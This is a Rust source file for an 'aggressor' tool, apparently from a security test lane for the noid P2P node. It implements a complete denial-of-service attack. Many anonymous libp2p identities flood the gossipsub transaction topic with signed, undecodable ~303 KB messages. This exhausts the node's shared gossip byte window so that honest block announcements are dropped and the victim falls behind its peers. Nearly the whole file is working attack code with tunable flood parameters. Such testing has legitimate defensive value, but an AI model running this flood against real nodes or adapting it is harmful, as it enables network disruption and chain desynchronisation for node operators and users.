//! Anonymous gossipsub tx-topic flood for the gossip-halt lane (U21 live leg).
//!
//! The victim's process-global gossip byte window
//! (`GOSSIP_ACCEPT_BYTES_PER_WINDOW` = 64 MiB / `GOSSIP_ACCEPT_WINDOW` = 10 s,
//! noid_p2p/src/network.rs:492-493) is charged by `admit_tx_gossip_ingress`
//! BEFORE the node decodes the intent, and the same window is shared with
//! honest BLOCK ANNOUNCEMENTS (network.rs:6491-6495). This aggressor opens
//! N anonymous identities (fresh noise keys, no credentials), negotiates the
//! real /meshsub/1.1.0 gossipsub stream on each, and publishes
//! decode-failing ~303 KB payloads on the txs topic in 10 s bursts:
//! identities x per-burst x payload-bytes > 64 MiB exhausts the window, so
//! later block announcements in the same window are dropped (`Ignore`) and the
//! victim stops learning new headers while its peers advance.
//!
//! Wire details are gossipsub 0.48.0 (the node's pinned version): RPC
//! protobuf, unsigned-varint frame prefix, Strict validation (from + 8-byte
//! seqno + ed25519 signature over `libp2p-pubsub:` + the message without
//! signature/key), frame <= max_transmit_size = 303,495 B.

use std::time::{Duration, Instant};

use anyhow::{bail, Context, Result};
use futures::future::poll_fn;
use futures::{AsyncReadExt, AsyncWriteExt};

use libp2p_identity::{ed25519, PeerId};

#[path = "../aggressor_common.rs"]
mod common;
use common::{conn_aware, connect_as, negotiate_outbound, GOSSIPSUB_PROTOCOL};

const TXS_TOPIC: &str = "/noid/mainnet/860e70453390bf81/txs/1";
const SIGNING_PREFIX: &[u8] = b"libp2p-pubsub:";
/// Node wire cap for a tx intent (noid_tx::MAX_PAGED_SPEND_INTENT_BYTES).
const MAX_TX_INTENT_BYTES: usize = 303_495;

fn put_varint(buf: &mut Vec<u8>, mut value: usize) {
    loop {
        let mut byte = (value & 0x7f) as u8;
        value >>= 7;
        if value != 0 {
            byte |= 0x80;
        }
        buf.push(byte);
        if value == 0 {
            break;
        }
    }
}

fn put_field(buf: &mut Vec<u8>, tag: u8, data: &[u8]) {
    buf.push(tag);
    put_varint(buf, data.len());
    buf.extend_from_slice(data);
}

/// protobuf gossipsub::Message (from, data, seqno, topic[, signature]) —
/// fields in schema order, matching quick-protobuf's writer byte-for-byte.
fn encode_message(
    from: &[u8],
    data: &[u8],
    seqno: &[u8; 8],
    topic: &str,
    signature: Option<&[u8]>,
) -> Vec<u8> {
    let mut m = Vec::with_capacity(data.len() + 170);
    put_field(&mut m, 0x0A, from); // 1: from
    put_field(&mut m, 0x12, data); // 2: data
    put_field(&mut m, 0x1A, seqno); // 3: seqno
    put_field(&mut m, 0x22, topic.as_bytes()); // 4: topic
    if let Some(sig) = signature {
        put_field(&mut m, 0x2A, sig); // 5: signature
    }
    m
}

/// One RPC { publish: [message] } frame: unsigned-varint length prefix then
/// the protobuf payload.
fn rpc_frame(message: &[u8]) -> Vec<u8> {
    let mut payload = Vec::with_capacity(message.len() + 6);
    payload.push(0x12); // field 2 (publish), wire type 2
    put_varint(&mut payload, message.len());
    payload.extend_from_slice(message);
    let mut frame = Vec::with_capacity(payload.len() + 6);
    put_varint(&mut frame, payload.len());
    frame.extend_from_slice(&payload);
    frame
}

/// Signed gossipsub message frame for this identity. The signature covers
/// SIGNING_PREFIX + the protobuf message with signature/key fields absent —
/// exactly what the victim's Strict-mode verifier reconstructs.
fn build_frame(
    keypair: &ed25519::Keypair,
    peer_id_bytes: &[u8],
    data: &[u8],
    seqno: &[u8; 8],
) -> Vec<u8> {
    let unsigned = encode_message(peer_id_bytes, data, seqno, TXS_TOPIC, None);
    let mut signed_input = Vec::with_capacity(SIGNING_PREFIX.len() + unsigned.len());
    signed_input.extend_from_slice(SIGNING_PREFIX);
    signed_input.extend_from_slice(&unsigned);
    let signature = keypair.sign(&signed_input);
    let message = encode_message(peer_id_bytes, data, seqno, TXS_TOPIC, Some(&signature));
    rpc_frame(&message)
}

struct Args {
    victim: String,
    identities: usize,
    per_burst: usize,
    payload_bytes: usize,
    cycle_ms: u64,
    duration_secs: u64,
    label: String,
}

fn parse_args() -> Result<Args> {
    let mut args: Vec<String> = std::env::args().skip(1).collect();
    let victim = args
        .first()
        .cloned()
        .context("usage: anon-gossip-storm 127.0.0.1:P2P [--identities N] [--per-burst N] [--payload-bytes N] [--cycle-ms N] [--duration-secs N] [--label L]")?;
    args.remove(0);
    let mut out = Args {
        victim,
        identities: 5,
        per_burst: 50,
        payload_bytes: 303_300,
        cycle_ms: 10_050,
        duration_secs: 120,
        label: "storm".to_string(),
    };
    while !args.is_empty() {
        let flag = args.remove(0);
        let value = args.first().cloned().context("flag missing value")?;
        args.remove(0);
        match flag.as_str() {
            "--identities" => out.identities = value.parse()?,
            "--per-burst" => out.per_burst = value.parse()?,
            "--payload-bytes" => out.payload_bytes = value.parse()?,
            "--cycle-ms" => out.cycle_ms = value.parse()?,
            "--duration-secs" => out.duration_secs = value.parse()?,
            "--label" => out.label = value,
            other => bail!("unknown flag {other}"),
        }
    }
    if out.payload_bytes == 0 || out.payload_bytes > MAX_TX_INTENT_BYTES {
        bail!("--payload-bytes must be in 1..={MAX_TX_INTENT_BYTES}");
    }
    Ok(out)
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    let args = parse_args()?;
    let offered_per_window = args.identities * args.per_burst * args.payload_bytes;
    println!(
        "[{}] victim={} identities={} per-burst={} payload={}B cycle={}ms duration={}s offered={}B/window ({} MiB) vs 64 MiB cap",
        args.label,
        args.victim,
        args.identities,
        args.per_burst,
        args.payload_bytes,
        args.cycle_ms,
        args.duration_secs,
        offered_per_window,
        offered_per_window / (1024 * 1024),
    );

    let deadline = Instant::now() + Duration::from_secs(args.duration_secs);
    let mut handles = Vec::new();
    for id in 0..args.identities {
        let victim = args.victim.clone();
        let label = args.label.clone();
        let per_burst = args.per_burst;
        let payload_bytes = args.payload_bytes;
        let cycle_ms = args.cycle_ms;
        let deadline = deadline;
        handles.push(tokio::spawn(async move {
            run_identity(&victim, id, &label, per_burst, payload_bytes, cycle_ms, deadline).await
        }));
    }
    let mut total_sent = 0usize;
    for (id, handle) in handles.into_iter().enumerate() {
        match handle.await {
            Ok(Ok(sent)) => {
                println!("[{} id{}] finished: sent={} frames", args.label, id, sent);
                total_sent += sent;
            }
            Ok(Err(error)) => println!("[{} id{}] failed: {error:#}", args.label, id),
            Err(error) => println!("[{} id{}] join error: {error}", args.label, id),
        }
    }
    println!("[{}] total sent={} frames", args.label, total_sent);
    Ok(())
}

/// xorshift128+ PRNG — only payload bytes are garbage; quality is irrelevant.
struct Rng(u64, u64);

impl Rng {
    fn from_env() -> Self {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default();
        let a = now.as_nanos() as u64 ^ (std::process::id() as u64) << 32 | 1;
        let b = now.as_secs() ^ ((&now as *const _ as u64) << 16) | 1;
        Rng(a | 1, b | 1)
    }

    fn next_u64(&mut self) -> u64 {
        let mut s1 = self.0;
        let s0 = self.1;
        let result = s0.wrapping_add(s1);
        self.0 = s0;
        s1 ^= s1 << 23;
        self.1 = s1 ^ s0 ^ (s1 >> 17) ^ (s0 >> 26);
        result
    }
}

#[allow(clippy::too_many_arguments)]
async fn run_identity(
    victim: &str,
    id: usize,
    label: &str,
    per_burst: usize,
    payload_bytes: usize,
    cycle_ms: u64,
    deadline: Instant,
) -> Result<usize> {
    let keypair = ed25519::Keypair::generate();
    let peer_id = PeerId::from_public_key(&libp2p_identity::Keypair::from(keypair.clone()).public());
    let peer_id_bytes = peer_id.to_bytes();
    println!("[{label} id{id}] peer_id={peer_id}");

    // Base random payload; the first 16 bytes are rewritten per message so
    // every message is data-unique (unique poseidon message id → no dedupe).
    let mut base = vec![0u8; payload_bytes];
    let mut rng = Rng::from_env();
    for chunk in base.chunks_mut(8) {
        let value = rng.next_u64().to_le_bytes();
        for (i, byte) in chunk.iter_mut().enumerate() {
            *byte = value[i];
        }
    }

    let mut sent_total = 0usize;
    let mut message_counter: u64 = 0;
    let mut reconnects = 0usize;

    while Instant::now() < deadline {
        let result = run_session(
            victim,
            &keypair,
            &peer_id_bytes,
            label,
            id,
            per_burst,
            &base,
            cycle_ms,
            deadline,
            &mut message_counter,
            &mut sent_total,
        )
        .await;
        match result {
            Ok(()) => break, // session ran to the deadline
            Err(error) => {
                reconnects += 1;
                if Instant::now() >= deadline {
                    break;
                }
                println!("[{label} id{id}] session error (reconnect #{reconnects}): {error:#}");
                tokio::time::sleep(Duration::from_millis(500)).await;
            }
        }
    }
    Ok(sent_total)
}

#[allow(clippy::too_many_arguments)]
async fn run_session(
    victim: &str,
    keypair: &ed25519::Keypair,
    peer_id_bytes: &[u8],
    label: &str,
    id: usize,
    per_burst: usize,
    base: &[u8],
    cycle_ms: u64,
    deadline: Instant,
    message_counter: &mut u64,
    sent_total: &mut usize,
) -> Result<()> {
    let mut connection = connect_as(victim, keypair).await.context("transport")?;
    let stream = poll_fn(|cx| connection.poll_new_outbound(cx))
        .await
        .context("open meshsub stream")?;
    let mut stream = stream;
    // Negotiate INSIDE conn_aware: yamux stream reads only make progress
    // while the connection is polled (the node's confirm arrives as inbound
    // data — outside conn_aware the read would never complete).
    let negotiated = Box::pin(async {
        negotiate_outbound(&mut stream, GOSSIPSUB_PROTOCOL).await?;
        Ok::<(), anyhow::Error>(())
    });
    conn_aware(&mut connection, negotiated).await??;
    let (mut reader, mut writer) = stream.split();
    // Drain the node's control frames (graft/prune/ihave) so its gossipsub
    // writer never stalls against a full yamux window.
    tokio::spawn(async move {
        let mut buffer = [0u8; 4096];
        while reader.read(&mut buffer).await.unwrap_or(0) > 0 {}
    });

    let cycle = Duration::from_millis(cycle_ms);
    loop {
        let burst_start = Instant::now();
        for _ in 0..per_burst {
            if Instant::now() >= deadline {
                return Ok(());
            }
            let counter = *message_counter;
            *message_counter += 1;
            let mut payload = base.to_vec();
            let counter_bytes = counter.to_le_bytes();
            let prefix_len = counter_bytes.len().min(payload.len());
            payload[..prefix_len].copy_from_slice(&counter_bytes[..prefix_len]);
            let seqno = counter.to_be_bytes();
            let frame = build_frame(keypair, peer_id_bytes, &payload, &seqno);
            let mut write = Box::pin(async {
                writer.write_all(&frame).await?;
                writer.flush().await?;
                Ok::<(), std::io::Error>(())
            });
            conn_aware(&mut connection, &mut write).await??;
            *sent_total += 1;
        }
        println!(
            "[{label} id{id}] burst done: sent={} total, elapsed {:?}",
            *sent_total,
            burst_start.elapsed()
        );
        // Pace: keep the connection driven (identify/ping) while idle.
        let sleep_until = burst_start + cycle;
        let mut sleep =
            Box::pin(tokio::time::sleep_until(tokio::time::Instant::from_std(sleep_until)));
        conn_aware(&mut connection, &mut sleep).await?;
    }
}
